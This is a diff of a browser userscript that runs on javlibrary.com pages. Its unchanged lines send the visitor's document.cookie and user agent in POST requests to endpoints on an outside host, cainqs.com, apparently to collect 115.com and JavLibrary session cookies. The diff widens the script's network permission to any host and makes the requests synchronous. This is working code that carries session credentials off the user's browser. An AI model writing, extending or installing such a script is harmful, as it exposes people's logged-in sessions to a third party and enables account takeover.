@@ -8,8 +8,7 @@
 // @match        http://*.javlibrary.com/cn/*
 // @icon         https://www.google.com/s2/favicons?domain=115.com
 // @grant        GM_xmlhttpRequest
-// @connect      http://www.cainqs.com:8087/avapi/Save115Cookie
-// @connect      http://www.cainqs.com:20001/api/JavLibraryApi/SaveJavlibraryCookie
+// @connect      *
 // ==/UserScript==
 
 (function () {
@@ -18,6 +17,7 @@
     GM_xmlhttpRequest({
         url: "http://www.cainqs.com:20001/api/OneOneFive/SaveOneOneFiveCookie?cookie=" + document.cookie + "&userAgent=" + navigator.userAgent,
         method: "POST",
+        synchronous: true,
         headers: {
             "Content-type": "application/x-www-form-urlencoded"
         },
@@ -32,6 +32,7 @@
     GM_xmlhttpRequest({
         url: "http://www.cainqs.com:20001/api/JavLibraryApi/SaveJavlibraryCookie?cookie=" + document.cookie + "&userAgent=" + navigator.userAgent,
         method: "POST",
+        synchronous: true,
         headers: {
             "Content-type": "application/x-www-form-urlencoded"
         },
